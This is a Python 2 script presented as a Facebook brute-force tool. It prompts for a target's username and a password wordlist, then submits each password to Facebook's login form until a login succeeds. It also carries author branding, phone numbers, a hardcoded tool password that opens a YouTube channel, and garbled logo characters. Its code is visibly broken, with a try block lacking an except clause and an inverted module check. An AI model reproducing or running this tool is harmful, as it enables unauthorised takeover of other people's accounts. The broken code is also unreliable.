#!/usr/bin/python
# -*- coding: utf-8 -*-
        
        
        #############################################
        #                                           #
        #    Facebook BruteForce, by Rk Nahid        #
        #    Youtube:    99 GAMER    #
        #   Whtsapp Num +8801892752688                                  #
        #############################################


import time
import os

os.system('clear')
time.sleep(0.5)
try:
    import mechanize
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)


time.sleep(0.5)
user = raw_input('[рџ’Ђ] Target Username/ID/Email >>?? ')
time.sleep(0.8)
wrdlstFileName = raw_input('\n[рџ’Ђ] Wordlist Type nahid.txt >> ')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print '\n\nCracking '+user+' Now...'

time.sleep(1)
#Dev:Rk_Nahid
##### LOGO #####
logo = """
       \033[1;97m:в–’в–’в–’в–’в–€в–€в–€в–’в–€в–€в–€в–’в–€в–€в–€в–’в–€в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’в–’в–„1¤7:
      \033[1;93mв–’в–’в–’в–’в–’в–’в–’в–’в–€в–’в–€в–’в–€в–’в–’в–’в–€в–’в–€в–’в–€в–’в–’в–’в–’в–’в–’в–’в–’в–’в–„1¤7::     
     \033[1;95m:в–’в–’в–’в–’в–’в–’в–€в–€в–€в–’в–€в–’в–€в–’в–€в–€в–€в–’в–€в–’в–€в–’в–’в–’в–’в–’в–’в–’в–’в–’в–„1¤7:::      
    \033[1;94m::в–’в–’в–’в–’в–’в–’в–€в–’в–’в–’в–€в–’в–€в–’в–€в–’в–’в–’в–€в–’в–€в–’в–’в–’в–’в–’в–’в–’в–’в–’в–„1¤7::::      
   \033[1;96m:::в–’в–’в–’в–’в–’в–’в–€в–€в–€в–’в–€в–€в–€в–’в–€в–€в–€в–’в–€в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’в–’в–„1¤7:::::         
  \033[1;96m::в™§в™§в™§в™§в™§в™§в™§в™§в™§в™§\033[1;91mWhatsapp\033[1;96mв™§в™§в™§в™§в™§в™§в™§в™§в™§в™§в–’в–’в–’в–’в–’в–’в–„1¤7::::        
  \033[1;91m:гЂ‹г„1¤7‹г„1¤7‹\033[1;93m+923062045786\033[1;91mгЂЉг„1¤7Љг„1¤7Љв–’в–’в–’в–’в–’в–’в–’в–’в–’в–’в–’:::::
\033[1;95mв™Ўв•­в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7вЂўв—€вЂўв”Ђв”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в•®в™Ў\033[1;96m-KashiGangster-\033[1;95mв™Ўв•­в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7вЂўв—€вЂўв”Ђв”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в•®в™Ў
\033[1;92m..............................KashiGangster......................
\033[1;97mв•”в•— в•”в•—в•”в•ђв•¦в•¦в•¦в•ђв•„1¤7 в•”в•—в•”в•¦в•ђв•¦в•¦в•—
\033[1;97mв•‘в•‘ в•‘в•љв•Јв•‘в•‘в•‘в•‘в•©в•„1¤7 в•љв•—в•”в•Јв•‘в•‘в•‘в•‘   Arain Brand
\033[1;97mв•љв•ќ в•љв•ђв•©в•ђв•©в•ђв•©в•ђв•ќв•ђ в•љв•ќв•љв•ђв•©в•ђв•„1¤7 
\033[1;93mв™Ўв•°в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7вЂўв—€вЂўв”Ђв”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в•Їв™Ў\033[1;96mKashiGangster\033[1;95mв™Ўв•°в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7вЂўв—€вЂўв”Ђв”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в”„1¤7в•Їв™Ў"""
print " \x1b[1;93m=Whtsapp Num +923062045786="
CorrectUsername = "Rk Nahid"
CorrectPassword = "RkNahid"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
def login():
	os.system('clear')
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '[+] Password Found > '+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "[!] Wrong Password! > "+str(password)
        except KeyboardInterrupt:
            print '\n#############################################\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(1)
print 'Sorry, none of the passswords in your wordlist is right.'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
